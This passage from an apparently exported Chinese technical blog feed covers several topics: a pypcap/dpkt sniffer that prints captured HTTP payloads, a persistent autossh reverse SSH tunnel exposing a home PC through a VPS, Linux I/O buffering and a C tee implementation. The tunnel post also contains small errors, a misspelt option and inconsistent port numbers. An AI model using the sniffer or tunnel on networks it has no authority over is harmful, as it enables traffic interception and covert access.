  if not isinstance(eth.data, dpkt.ip.IP):        print(&#39;&#39;)        return    ip = eth.data    # get fragments info    do_not_fragment = bool(ip.off &amp; dpkt.ip.IP_DF)    more_fragments = bool(ip.off &amp; dpkt.ip.IP_MF)    fragment_offset = ip.off &amp; dpkt.ip.IP_OFFMASK    print(&#39;IP: %s -&gt; %s (len=%d ttl=%d DF=%d MF=%d offset=%d)\n&#39; % (        ip_addr(ip.src), ip_addr(ip.dst), ip.len, ip.ttl,        do_not_fragment, more_fragments, fragment_offset))def anlysisData(data):    packet = dpkt.ethernet.Ethernet(data)    if isinstance(packet.data, dpkt.ip.IP):        ip = ip_addr(packet.data.dst)        if packet.data.data.dport == 80 or packet.data.data.sport == 80:            try:                print(packet.data.data.data.decode(&#39;utf-8&#39;, errors=&#39;ignore&#39;))            except UnicodeDecodeError as uderr:                print(uderr.__str__())def main():    if &#39;Windows&#39; in platform.platform():        iface = getInterfaceByName(&#39;Router&#39;)    else:        iface = &#39;enp2s0&#39;    captureData(iface)if __name__ == &quot;__main__&quot;:    main()</code></pre><h3 id="简要说明"><a href="#简要说明" class="headerlink" title="简要说明"></a>简要说明</h3><ul><li>获取接口</li></ul><p><code>getInterfaceByName</code>根据接口名称,通过查找注册表信息获取<code>pcap</code>所需的接口设备信息,适用于Windows系统.至于Linux系统,直接通过<code>ifconfig</code>获取即可,至于自动获取功能,目前还没写,以后再说吧.</p><ul><li>数据包存储</li></ul><p>为了将数据包存储到<code>.pcap</code>文件(此类文件可以使用wireshark打开)中,可以通过<code>dpkt.pcap.Writer</code>对象使用<code>writepkt</code>函数不断写入文件.</p><pre><code class="py">pcap_file = open(pcap_filepath, &#39;wb&#39;)writer = dpkt.pcap.Writer(pcap_file)for ptime, pdata in pkt:    writer.writepkt(pdata, ptime)</code></pre><ul><li>打印数据包基本信息</li></ul><p><code>printRawPkt</code>是个非常简单的打印数据包基本信息的函数,最多仅打印至<code>ip</code>信息,打印格式如下:</p><pre><code class="yml">Timestamp:  2018-12-31 13:58:39.850904Ethernet Frame:  00:e0:4c:5a:0a:78 00:0f:e9:61:30:00IP: 192.168.1.76 -&gt; 59.111.160.197 (len=52 ttl=64 DF=1 MF=0 offset=0)</code></pre><p>信息包含时间戳,以太网帧的<code>MAC</code>地址,<code>IP</code>地址及分片信息等.</p><ul><li>解析http数据包</li></ul><p><code>anlysisData</code>函数目前只是简单的检测及打印解码后的<code>http</code>包,使用<code>dpkt.ethernet.Ethernet</code>可以将原始数据包封装成一个结构化的以太网帧,之后按照网络协议栈的顺序便可逐层解析出链路层、网络层、传输层直至应用层.以上代码先是判断是否为<code>IP</code>报文,之后根据端口号判断是否为http报文,然后将数据解码后输出.</p><p>这个例子也很简单,很多异常情况也没考虑,本文主要目的是描述<code>pypcap</code>和<code>dpkt</code>的常用方法以及抓包工具的实现过程,至于针对具体协议的解析则需继续学习.</p><h3 id="抓包测试"><a href="#抓包测试" class="headerlink" title="抓包测试"></a>抓包测试</h3><pre><code class="zsh">➜ mkdir pkts➜ sudo ./pktcap.pyStart capture...Timestamp:  2018-12-31 13:58:37.148964Ethernet Frame:  00:36:76:6c:28:fe 33:33:00:00:00:16Timestamp:  2018-12-31 13:58:37.148978Ethernet Frame:  00:36:76:6c:28:fe 33:33:00:00:00:16Timestamp:  2018-12-31 13:58:37.529024Ethernet Frame:  00:36:76:6c:28:fe 33:33:00:00:00:16Timestamp:  2018-12-31 13:58:37.809011Ethernet Frame:  98:e0:d9:a4:50:1d 33:33:00:00:00:16Timestamp:  2018-12-31 13:58:39.850904Ethernet Frame:  00:e0:4c:5a:0a:78 00:0f:e9:61:30:00IP: 192.168.1.76 -&gt; 59.111.160.197 (len=52 ttl=64 DF=1 MF=0 offset=0)Timestamp:  2018-12-31 13:58:39.862890Ethernet Frame:  00:0f:e9:61:30:00 00:e0:4c:5a:0a:78IP: 59.111.160.197 -&gt; 192.168.1.76 (len=40 ttl=55 DF=1 MF=0 offset=0)Timestamp:  2018-12-31 13:58:40.289465Ethernet Frame:  b0:19:c6:17:0a:57 33:33:00:00:00:16Timestamp:  2018-12-31 13:58:40.369068Ethernet Frame:  a4:d1:8c:0b:54:12 33:33:00:00:00:16Timestamp:  2018-12-31 13:58:41.859034Ethernet Frame:  a0:4e:a7:e0:65:3d 33:33:00:00:00:16Timestamp:  2018-12-31 13:58:42.079218Ethernet Frame:  8c:6d:50:7d:f9:fc ff:ff:ff:ff:ff:ffIP: 0.0.0.0 -&gt; 255.255.255.255 (len=352 ttl=64 DF=0 MF=0 offset=0)^C10 packets received➜ cd pkts➜ lspkts_20181230-185017.pcap  pkts_20181231-203416.pcap  pkts_20181231-215837.pcap</code></pre><p>代码已上传至<a href="https://github.com/Litreily/Python-demos.git">github Python-demos</a> <code>sniffer.py</code></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://www.cnblogs.com/jackadam/p/8279080.html">windows 环境下python 安装 pypcap...</a></li><li><a href="https://www.cnblogs.com/xuanhun/p/5625186.html">Python黑客编程3网络数据监听和过滤</a></li><li><a href="https://blog.csdn.net/weixin_39138707/article/details/74612637">Mac下用python+pypcap+dpkt抓取IP数据包并分析</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pypcap </tag>
            
            <tag> dpkt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>autossh反向代理实现内网穿透</title>
      <link href="2018/11/25/autossh/"/>
      <url>2018/11/25/autossh/</url>
      
        <content type="html"><![CDATA[<p>有时候需要在公司使用家里个人PC的一些资源，此时可以选择<code>Teamvieawer</code>进行远程，但是略微麻烦而且访问速率较慢，此时通过<code>vps</code>实现内网穿透就是个不错的想法。</p><p><img src="/assets/proxy/autossh_proxy.svg" alt="vps proxy"></p><p>本文讲述的内网穿透方法是通过<code>autossh</code>实现vps对内网的反向代理，在vps与内网之间建立一条长连接，使得外网PC通过vps的反向代理访问内网PC。整个实现所需的条件如下：</p><ol><li>带有公网IP(<code>222.222.222.222</code>)的vps</li><li>保持开机且联网的内网PC</li><li>任一联网的外网PC</li></ol><span id="more"></span><h2 id="vps配置"><a href="#vps配置" class="headerlink" title="vps配置"></a>vps配置</h2><p>修改vps的文件<code>/etc/ssh/sshd_config</code>, 取消以下参数的注释或是修改其值</p><pre><code class="yml">GetewayPorts yesTCPKeepAlive yesClientAliveInterval 60ClientAliveCountMax 3</code></pre><h2 id="内网PC配置"><a href="#内网PC配置" class="headerlink" title="内网PC配置"></a>内网PC配置</h2><p>为了保证内网PC可以免密码访问vps，需要在vps添加内网PC的公钥</p><pre><code class="sh">$ ssh-keygen# ... enter ...$ ssh-copy-id -i ~/.ssh/id_rsa.pub -p 27000 root@222.222.222.222# 27000是访问vps的端口号，root是vps的用户名，222.222.222.222是vps的公网IP</code></pre><p>配置好后，在内网PC安装<code>autossh</code></p><pre><code class="sh">sudo apt-get install -y autossh</code></pre><p>安装好以后，通过以上指令便可实现反向代理：</p><pre><code class="sh">autossh -p 27000 -M 27400 -NR &#39;*:27401:localhost:27402&#39; root@222.222.222.222</code></pre><p>其中的参数：</p><ul><li><code>-p 27000</code>: vps ssh 端口，默认值22</li><li><code>-M 27440</code>: 中继服务器（vps）的代理服务监听端口，需保证不被vps其它进程占用</li><li><code>-NR &#39;*:27401:localhost:27402&#39;</code>: 端口映射，vps的<code>27401</code>端口映射到内网PC的<code>27402</code>端口</li><li><code>root@222.222.222.222</code>: vps的用户名及IP</li></ul><p>这里涉及到4个端口，<code>27000</code>是vps ssh的监听端口，<code>27400</code>是vps代理服务的监听端口，<code>27401</code>和<code>27402</code>是vps与内网PC之间的一对端口映射，外网PC需要通过vps的<code>27401</code>端口访问内网。</p><h3 id="配置autossh服务"><a href="#配置autossh服务" class="headerlink" title="配置autossh服务"></a>配置autossh服务</h3><p>使用以上指令已经可以完成所需的功能了，但是每次开机都得重新输一遍，很不方便，所以可以把指令封装成一个服务，然后设置为开机启动。在<code>ubuntu</code>中，可以在<code>lib/systemd/system</code>目录下新建一个<code>autossh.service</code>的文件，并输入以下内容：</p><pre><code class="yml">[Unit]Description=Auto SSH TunnelAfter=network-online.target[Service]User=autosshType=simpleExecStart=/usr/bin/autossh -p 27000 -M 27400 -NR &#39;*:27401:localhost:27402&#39; root@222.222.222.222 -i ~/.ssh/id_rsaExecReload=/bin/kill -HUP $MAINPIDKillMode=processStartLimitIntervalSec=5StartLimitBurst=12Restart=always[Install]WantedBy=multi-user.targetWantedBy=graphical.target</code></pre><p>配置好后，通过以下指令完成启动、查询和自启动。</p><ul><li>启动服务：<code>sudo systemctl autossh start</code></li><li>查看状态：<code>sudo service autossh status</code></li><li>开机启动：<code>sudo systemctl enable autossh.service</code></li></ul><h2 id="远程访问内网"><a href="#远程访问内网" class="headerlink" title="远程访问内网"></a>远程访问内网</h2><p>最后就是如何通过外网访问内网了，其实和访问vps本身类似，仅仅是改一下连接端口即可。</p><pre><code class="sh">sudo ssh root@222.222.222.222 -p 27401</code></pre><h2 id="扩展说明"><a href="#扩展说明" class="headerlink" title="扩展说明"></a>扩展说明</h2><p>本文介绍的是通过vps实现反向代理，如果没有vps的话就无法使用了，此时可以学习下<code>frp</code>或<code>Ngrok</code>，使用公共的服务器实现代理．</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.windrunner.me/sa/reverse-ssh.html">使用 autossh 建立反向 SSH 隧道管理个人计算机</a></li><li><a href="https://www.cnblogs.com/eshizhan/archive/2012/07/16/2592902.html">SSH反向连接及Autossh</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
            <tag> proxy </tag>
            
            <tag> vps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux中的文件I/O缓冲</title>
      <link href="2018/10/25/io-cache/"/>
      <url>2018/10/25/io-cache/</url>
      
        <content type="html"><![CDATA[<p>近日阅读《Linux/UNIX系统编程手册》第13章 - 文件I/O缓冲，有些收获，是以此文以记之。以往只知道Linux的I/O操作有缓冲机制，但始终不知道具体的缓冲流程及使用方法。读完本章节后方才有种恍然大悟的感觉，久违的因读书而觉得舒爽的感觉。</p><p>好了，进入正题，下图摘自原文(13.4-I/O缓冲小结)，此图概括了<code>stdio</code>库及内核针对输出文件所用的缓冲以及各类缓冲的控制机制。本文依据此图逐步揭开文件I/O缓冲的面纱。</p><p><img src="/assets/linux/io_buffer.jpg" alt="I/O缓冲"></p><span id="more"></span><h2 id="I-O缓冲的类型"><a href="#I-O缓冲的类型" class="headerlink" title="I/O缓冲的类型"></a>I/O缓冲的类型</h2><p>在使用<code>stdio</code>库中文件写操作相关的函数（如:<code>printf</code>, <code>fputc</code>, <code>fputs</code>, <code>fwrite</code>）时，待写入数据从用户空间内存到内核空间内存、再到磁盘会经过以下3类缓冲</p><ol><li>stdio库的缓冲区</li><li>文件I/O的内核缓冲区的高速缓存</li><li>磁盘驱动器内置高速缓存</li></ol><p>下面逐一介绍。</p><h3 id="stdio库的缓冲"><a href="#stdio库的缓冲" class="headerlink" title="stdio库的缓冲"></a>stdio库的缓冲</h3><p><img src="/assets/linux/stdio_buffer.png" alt="stdio buffer"></p><p>如上图所示，<code>stdio</code>库实现的缓冲位于用户空间内存当中，该缓冲区A会缓冲大块的文件数据以减少系统调用（如: <code>read</code>, <code>write</code>）。</p><p>需要知道的是，<code>stdio</code>库函数内部会调用底层的系统调用，如<code>fgets</code>调用<code>read</code>，<code>fputs</code>调用<code>write</code>。但是在调用之前，</p><ul><li>对于读操作，库函数会先检查缓冲区A内是否已有所需数据，如果有则直接从缓冲区A读取；否则先执行系统调用<code>read</code>，从内核缓冲区B中读取数据到缓冲区A，然后从缓冲区A读取数据</li><li>对于写操作，库函数会先检查缓冲区A是否还有空闲，如果有则先存入缓冲区A；否则先执行库函数<code>fflush</code>，将缓冲区A中数据刷新至内核缓冲区B，然后将当前待写入数据写入缓冲区A</li></ul><p>对于<code>stdio</code>库的缓冲数据，在执行库函数之后的某一时刻，系统会通过<code>fflush</code>函数将数据刷新至内核缓冲区。当然，我们也可以手动执行<code>fflush</code>函数强制刷新数据至内核缓冲区。</p><p><code>fflush</code>定义如下：</p><pre><code class="c">#include &lt;stdio.h&gt;int fflush(FILE *stream);</code></pre><ul><li><code>fflush(stdin)</code>会清空缓冲区内的标准输入数据</li><li><code>fflush(stdout)</code>会将缓冲区内的写入数据刷新至终端输出</li><li><code>stderr</code>默认不使用缓冲</li><li><code>fflush(stream)</code>将文件流<code>stream</code>的缓冲数据刷新至内核缓冲区</li></ul><h3 id="文件I-O的内核缓冲"><a href="#文件I-O的内核缓冲" class="headerlink" title="文件I/O的内核缓冲"></a>文件I/O的内核缓冲</h3><p>不管使不使用<code>stdio</code>库函数，最终都会直接或间接的调用<code>open</code>, <code>read</code>, <code>write</code>, <code>lseek</code>等系统调用读写文件I/O，那么系统就会在写操作后将数据存入内核缓冲区，但此时还并未存入磁盘。</p><p>也就是说，在执行<code>write</code>后，函数直接返回，但数据只是存在内核缓冲区中。当有新的读取请求时，会先在内核缓冲区中查找，如果有则直接返回；如果没有则先从磁盘读入大块数据至内核缓冲区，这样可以减少磁盘读写操作。毕竟，相比于系统调用和用户空间与内核空间之间的数据传输，磁盘读写所花费的时间要长得多。</p><blockquote><p>若内容发生变化的内核缓冲区在30s内未经显式方式同步到磁盘上，则一条长期运行的内核线程会确保将其刷新到磁盘上。</p></blockquote><p>不同版本的<code>linux</code>，其内核线程不一样，可以使用指令<code>ps aux |grep flush</code>粗略查看一下。</p><pre><code class="bash"># 查看内核线程刷新之前脏缓冲区必须达到的时间，单位：0.01s$ cat /proc/sys/vm/dirty_expire_centisecs3000# 查看内核线程执行周期，单位：0.01s$ cat /proc/sys/vm/dirty_writeback_centisecs500</code></pre><h3 id="磁盘驱动器内置缓冲"><a href="#磁盘驱动器内置缓冲" class="headerlink" title="磁盘驱动器内置缓冲"></a>磁盘驱动器内置缓冲</h3><p>内核缓冲区的数据在真正存入物理磁盘前，会先存入磁盘驱动器内置的高速缓存，之后在某一时刻写入磁盘。具体过程没有深究过，目前只需知道还有这么一层缓冲区即可。</p><h2 id="控制文件I-O缓冲"><a href="#控制文件I-O缓冲" class="headerlink" title="控制文件I/O缓冲"></a>控制文件I/O缓冲</h2><p>通过某些方式，我们可以控制I/O缓冲机制，其中包括修改缓冲区大小、缓冲模式，禁用缓冲，强制刷新缓冲数据等。</p><h3 id="控制stdio库的缓冲"><a href="#控制stdio库的缓冲" class="headerlink" title="控制stdio库的缓冲"></a>控制stdio库的缓冲</h3><p>对于<code>stdio</code>库分配的缓冲区，在默认情况下会分配<code>BUFSIZ</code>大小的缓冲区，该参数值的大小说法不一，但据原文说明，在<code>glibc</code>中定义为<code>8192</code>字节。</p><p><code>stdio</code>流的缓冲模式分以下三类：</p><ul><li><code>_IONBF</code> - 不缓冲</li><li><code>_IOLBF</code> - 行缓冲，针对终端设备，在输出一个换行符前缓冲数据。对输入流，每次读取一行数据</li><li><code>_IOFBF</code> - 全缓冲，单词读、写数据(read, write)的大小与缓冲区大小一致，磁盘默认使用此模式</li></ul><p>我们可以通过库函数<code>setvbuf</code>, <code>setbuffer</code>, <code>setbuf</code>三者之一设置<code>stdio</code>流的缓冲模式。</p><pre><code class="c">#include &lt;stdio.h&gt;void setbuf(FILE *stream, char *buf);void setbuffer(FILE *stream, char *buf, size_t size);int setvbuf(FILE *stream, char *buf, int mode, size_t size);</code></pre><p><code>setvbuf</code>函数中的mode对应的就是缓冲模式，可选项为<code>_IONBF</code>, <code>_IOLBF</code>, <code>_IOFBF</code>，<code>buf</code>和<code>size</code>分别对应指定的缓冲区指针及缓冲区大小。当然，当为不缓冲模式时，函数将忽略<code>buf</code>，<code>size</code>这两个参数。示例如下：</p><pre><code class="c">#define BUF_SIZE 4096static char buf[BUF_SIZE];FILE *fp;fp = fopen(&quot;test.txt&quot;, &#39;w&#39;);if(setvbuf(fp, buf, _IOFBF, BUF_SIZE) !=0 )    exit(EXIT_FAILURE);</code></pre><p>从下面的<code>uClibc</code>源码可以看出，<code>setbuffer</code>, <code>setbuf</code>仅仅是对<code>setvbuf</code>的简单封装。但要注意的是，<code>SUSv3</code>标准并未对<code>setbuffer</code>函数加以定义，在使用时需要加上宏定义<code>_BSD_SOURCE</code>。</p><pre><code class="c">void setbuffer(FILE * __restrict stream, register char * __restrict buf, size_t size)&#123;#ifdef __STDIO_BUFFERS    setvbuf(stream, buf, (buf ? _IOFBF : _IONBF), size);#endif&#125;void setbuf(FILE * __restrict stream, register char * __restrict buf)&#123;#ifdef __STDIO_BUFFERS    setvbuf(stream, buf, ((buf != NULL) ? _IOFBF : _IONBF), BUFSIZ);#endif&#125;</code></pre><p>如果想要禁用缓冲，通常可以使用<code>setbuf(stream, NULL)</code>实现。但通常不推荐这么做，应该合理组织代码，在特定情况使用<code>fflush</code>刷新数据，这样可以在有效利用用户空间缓冲作用的同时，减少系统调用，适宜的存储数据至内核缓冲区。</p><h3 id="控制文件I-O的内核缓冲"><a href="#控制文件I-O的内核缓冲" class="headerlink" title="控制文件I/O的内核缓冲"></a>控制文件I/O的内核缓冲</h3><p>在某些情况下，我们可能需要强制将内核缓冲区内的数据刷新至磁盘，而不必等待内核线程等待特定时间后才写入。此时主要有两种选择</p><ol><li>使用<code>fsync</code>，<code>fdatasync</code>, <code>sync</code>系统调用中的某一个将内核缓冲区的数据强制写入磁盘</li><li>以<code>O_SYNC</code>同步方式调用<code>open</code>打开文件，此后每次读写操作都会自动立即写入磁盘</li></ol><h4 id="fsync"><a href="#fsync" class="headerlink" title="fsync"></a>fsync</h4><pre><code class="c">#include &lt;unistd.h&gt;int fsync(int fd);int fdatasync(int fd);void sync(void);</code></pre><p><code>fsync</code>保证<strong>同步I/O文件完整性</strong>，<code>fdatasync</code>保证<strong>同步I/O数据完整性</strong>。两个<strong>完整性</strong>的区别在于前者会将所有更新的文件元数据写入磁盘，后者不会传递所有经过修改的文件元数据属性（如：时间戳）。</p><p><code>fsync</code>与<code>fdatasync</code>均是刷新指定文件流数据，而<code>sync()</code>函数会更新所有内核缓冲区数据至磁盘，对应<code>shell</code>指令<code>sync</code>。</p><h4 id="O-SYNC"><a href="#O-SYNC" class="headerlink" title="O_SYNC"></a>O_SYNC</h4><p><code>fsync</code>等系统调用需要被手动调用，仅在被调用处起作用；而以<code>O_SYNC</code>方式<code>open</code>的文件流，后续所有写操作都将把数据直接写入磁盘。</p><p>不到万不得已还是不要以这种方式打开文件流，因为这将严重影响性能，当<code>write</code>缓冲区较小时尤为突出。</p><h3 id="禁用磁盘高速缓存"><a href="#禁用磁盘高速缓存" class="headerlink" title="禁用磁盘高速缓存"></a>禁用磁盘高速缓存</h3><p>按照书上描述，使用<code>hdparm -W0</code>可以禁用磁盘上的高速缓存，但我没有实际试过。</p><h3 id="直接I-O"><a href="#直接I-O" class="headerlink" title="直接I/O"></a>直接I/O</h3><p>当以<code>O_DIRECT</code>方式<code>open</code>文件流时，数据流会绕过内核缓冲区高速缓存，从用户空间直接传入文件或磁盘，此类过程称为<strong>直接I/O</strong>。</p><p>使用直接I/O对I/O操作有诸多对齐限制，主要保证读取和写入时，偏移量、数据长度以及内存边界需要是块设备基本单元(通常为512字节)的整数倍，否则会导致<code>EINVAL</code>错误。</p><p>使用直接I/O时，可以结合<code>memalign</code>函数动态分配内存。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>使用<code>stdio</code>库函数可以利用该库实现的用户空间缓冲区减少系统调用；<code>read</code>，<code>write</code>等系统调用默认不与磁盘直接传递数据，而是经过文件I/O的内核缓冲区作为中转，以此减少磁盘操作。</p><p>通过<code>fflush</code>函数可以将<code>stdio</code>流的缓冲区数据刷新至内核缓冲区；通过<code>fsync</code>, <code>fdatasync</code>函数可以将内核缓冲区数据刷新至磁盘。</p><p>使用<code>setvbuf</code>, <code>setbuf</code>等函数可以设置<code>stdio</code>流的缓冲模式，甚至禁用缓冲；以<code>O_SYNC</code>方式打开文件，可以在立即将数据同步至磁盘文件。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol><li>《Linux/UNIX系统编程手册》 第13章 文件I/O缓冲</li><li><a href="http://www.pixelbeat.org/programming/stdio_buffering/">buffering in standard streams</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stdio </tag>
            
            <tag> cache </tag>
            
            <tag> buffer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux指令 - tee的实现</title>
      <link href="2018/09/27/tee/"/>
      <url>2018/09/27/tee/</url>
      
        <content type="html"><![CDATA[<p>近日学习<a href="https://book.douban.com/subject/25809330/">《Linux/UNIX 系统编程手册》</a>一书，巩固了C语言中一些常用库函数的使用，主要涉及基本IO操作相关的库函数。为了加深理解，手动实现了Linux系统中的<code>tee</code>指令的功能。借此文记述实现过程。</p><h2 id="tee功能简述"><a href="#tee功能简述" class="headerlink" title="tee功能简述"></a>tee功能简述</h2><p><code>tee</code>类似于一个单输入双输出的三通管道，将标准输入的数据输出到指定文件和标准输出中。为实现这个指令，主要考虑以下几点：</p><ol><li>解析<code>tee</code>包含的命令行参数</li><li>读取标准输入数据，并将数据写入标准输出和指定文件</li><li>若未指定文件，则仅将数据输出到标准输出</li></ol><p>下面逐步分析每个要点的实现方法。</p><h2 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h2><p><code>tee</code>包含以下可选项，本文实现仅考虑<code>-a</code>,<code>--version</code>,<code>--help</code></p><pre><code class="sh">Usage: tee [OPTION]... [FILE]...Copy standard input to each FILE, and also to standard output.  -a, --append              append to the given FILEs, do not overwrite  -i, --ignore-interrupts   ignore interrupt signals  -p                        diagnose errors writing to non pipes      --output-error[=MODE]   set behavior on write error.  See MODE below      --help     display this help and exit      --version  output version information and exit</code></pre><p>为解析命令行的<strong>可选项</strong>，需要用到库函数<code>getopt</code>或<code>getopt_long</code>，前者仅支持短格式，后者支持长短格式。下面对使用这两个函数解析参数的方法进行对比。</p><h3 id="getopt"><a href="#getopt" class="headerlink" title="getopt"></a>getopt</h3><p><code>getopt</code>函数声明及相关参数如下：</p><pre><code class="c">#include &lt;unistd.h&gt;int getopt(int argc, char * const argv[],            const char *optstring);extern char *optarg;extern int optind, opterr, optopt;</code></pre><ul><li><code>argc</code>: 与main函数的argc一致，代表参数个数</li><li><code>argv</code>: 与main函数的argv一致，代表参数值</li><li><code>optstring</code>: 可选项字符串，如<code>a:bc:d:</code>，参数后带冒号代表该选项需要给定参数值</li><li><code>optarg</code>: 存储可选项的参数值，如果不带参数则为NULL</li><li><code>optind</code>: 存储下一个可选参数的索引，每执行一次<code>getopt</code>就加1</li><li><code>opterr</code>: 错误提示标志，默认为1，当输入参数无效时，会给出提示</li><li><code>optopt</code>: 是对可选参数字符的一个备份，当输入的参数无效时可用</li></ul><p>下面使用<code>getopt</code>实现对选项<code>-a</code>的解析：</p><pre><code class="c">int main(int argc, char *argv[])&#123;    int opt, fd = -1;    int flag_append = 0;    int flags = O_WRONLY | O_CREAT;    while((opt = getopt(argc, argv, &quot;a&quot;))!=-1) &#123;        switch(opt)&#123;            case &#39;a&#39;:                flag_append = 1;                break;            case &#39;?&#39;:            default:                exit(EXIT_FAILURE);                break;        &#125;    &#125;    if(optind &lt; argc)&#123;        flags += flag_append ? O_APPEND:O_TRUNC;        fd = open(argv[optind], flags, S_IRUSR | S_IWUSR                    | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);        if(fd == -1)&#123;            printf(&quot;invaild file -- \&quot;%s\&quot;\n&quot;, argv[optind]);            exit(EXIT_FAILURE);        &#125;    &#125;    output(fd);    if(fd &gt; 0)        close(fd);    return 0;&#125;</code></pre><p>以上代码结合<code>while</code>、 <code>switch</code>，使用<code>getopt</code>循环获取和分析可选项。当前只对一个可选项<code>a</code>进行了解析，当包含<code>-a</code>可选项时，flag_append设为1，之后根据该标志为文件的打开方式添加<code>O_APPEND</code>标志，后面读写数据时就会以附加的方式在文件尾部开始写入。</p><pre><code class="c">    if(optind &lt; argc)&#123;        flags += flag_append ? O_APPEND:O_TRUNC;        fd = open(argv[optind], flags, S_IRUSR | S_IWUSR                | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);        //...</code></pre><p>说明：  </p><ol><li>如果不带<code>-a</code>，程序默认会以<code>O_TRUNC</code>方式打开文件，表示截断，会以重写的方式覆盖原文件；</li><li><code>optind</code>小于<code>argc</code>时，说明除了可选参数之外，用户还输入了其它参数，这里对应的是<code>tee</code>指令所需的文件名称。此时argv[optind]刚好对应第一个非可选参数。</li></ol><h3 id="getopt-long"><a href="#getopt-long" class="headerlink" title="getopt_long"></a>getopt_long</h3><p><code>getopt_long</code>定义如下：</p><pre><code class="c">#include &lt;getopt.h&gt;int getopt_long(int argc, char * const argv[],            const char *optstring,            const struct option *longopts, int *longindex);</code></pre><p>与<code>getopt</code>相比，多了两个参数<code>longopts</code>, <code>longindex</code></p><ul><li><code>longopts</code>: 长格式可选项，<code>option</code>结构体指针</li></ul><pre><code class="c">struct option &#123;    const char *name;       // 名称，如&quot;help&quot;    int         has_arg;    // 带参标志，0 或 1    int        *flag;       // 常设为NULL，若非NULL,将会把val值存入flag    int         val;        // getopt_long的返回值或将存入flag的值&#125;;</code></pre><p>当<code>flag</code>为NULL时，<code>getopt_long</code>返回<code>val</code>，否则返回0,并将<code>val</code>值存入<code>flag</code></p><ul><li><code>longindex</code>: 用于存储当前解析的长选项在<code>longopts</code>中的索引值(0,1,...)，通常设为<code>NULL</code></li></ul><p>下面使用<code>getopt_long</code>实现对选项<code>--help</code>，<code>--version</code>, <code>-a</code>的解析：</p><pre><code class="c">int main(int argc, char *argv[])&#123;    int opt, fd = -1;    int flag_append = 0;    int flags = O_WRONLY | O_CREAT;    struct option opts[] = &#123;        &#123;&quot;append&quot;, 0, NULL, &#39;a&#39;&#125;,        &#123;&quot;help&quot;, 0, NULL, &#39;h&#39;&#125;,        &#123;&quot;version&quot;, 0, NULL, &#39;v&#39;&#125;    &#125;;    while((opt = getopt_long(argc, argv, &quot;:av&quot;,opts, NULL))!=-1) &#123;        switch(opt)&#123;            case &#39;a&#39;:                flag_append = 1;                break;            case &#39;h&#39;:                usage();                break;            case &#39;v&#39;:                printf(VERSION&quot;\n&quot;);                exit(EXIT_FAILURE);                break;            case &#39;?&#39;:                printf(&quot;tee: invaild option -- &#39;%c&#39;\n&quot;                    &quot;Try &#39;tee --help&#39; for more infomation.\n&quot;, optopt);            default:                exit(EXIT_FAILURE);                break;        &#125;    &#125;    if(optind &lt; argc)&#123;        flags += flag_append ? O_APPEND:O_TRUNC;        fd = open(argv[optind], flags, S_IRUSR | S_IWUSR            | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);        if(fd == -1)&#123;            printf(&quot;invaild file -- \&quot;%s\&quot;\n&quot;, argv[optind]);            exit(EXIT_FAILURE);        &#125;    &#125;    output(fd);    if(fd &gt; 0)        close(fd);    return 0;&#125;</code></pre><p>以上代码中，长格式选项数组如下：</p><pre><code class="c">    struct option opts[] = &#123;        &#123;&quot;append&quot;, 0, NULL, &#39;a&#39;&#125;,        &#123;&quot;help&quot;, 0, NULL, &#39;h&#39;&#125;,        &#123;&quot;version&quot;, 0, NULL, &#39;v&#39;&#125;    &#125;;</code></pre><p>可以看到，当用户分别输入<code>--append</code>,<code>--help</code>,<code>--version</code>时，<code>getopt_long</code>分别返回<code>a</code>，<code>h</code>，<code>v</code>三个字符。</p><p>但注意<code>while((opt = getopt_long(argc, argv, &quot;:av&quot;,opts, NULL))!=-1)</code>只包含了<code>av</code>两个参数，所以当用户输入<code>-h</code>时，程序会认为是无效参数，也就是说<code>--help</code>在这里只支持长格式，而其它两个支持长短两种方式。</p><p>这也是指令的某些选项仅支持长格式的实现方法之一了，其它方法可参考函数<code>getopt_long_only</code></p><blockquote><p>说明：<br><code>:av</code>最前面的冒号可以起到<code>opterr=0</code>的效果，就是在参数无效时不给出默认提示</p></blockquote><h3 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h3><p><a href="#getopt_long">getopt_long</a>提到的<code>--help</code>选项是绝大多数指令都会实现的，用于提供帮助信息，下面是<code>tee</code>的<code>--help</code>输出。</p><pre><code class="c">void usage()&#123;    printf(&quot;Usage: tee [OPTION]... [FILE]\n&quot;        &quot;Copy standard input to each FILE, and also to standard output.\n\n&quot;        &quot;  -a, --append   append to the given FILEs, do not overwrite\n&quot;        &quot;  -v, --version  output version information and exit\n&quot;        &quot;      --help     display this help and exit\n&quot;    );    exit(EXIT_FAILURE);&#125;</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>关于参数解析，说到底就是<code>getopt</code>或<code>getopt_long</code>的应用。以上提到的可选参数中，其实也就<code>-a</code>会影响后续写入文件的方式，其它两个长格式选项均用于打印信息，之后便直接退出了。</p><p>而非可选项也只考虑了一个待写入文件的文件名，暂不考虑同时多文件写入。</p><h2 id="数据读写"><a href="#数据读写" class="headerlink" title="数据读写"></a>数据读写</h2><p><code>tee</code>数据读写很简单，仅需不断读取标准输入(stdin)数据，然后写入标准输出(stdout)和文件中，直到无数据可读或遇到中断信号为止。</p><pre><code class="c">#define BUF_SIZE 512void output(int fd)&#123;    int i = 0;    char buffer[BUF_SIZE] = &#123;0&#125;;    char ch;    fflush(stdin);    fflush(stdout);    while(read(STDIN_FILENO, &amp;ch, 1) &gt; 0)&#123; // read from stdin        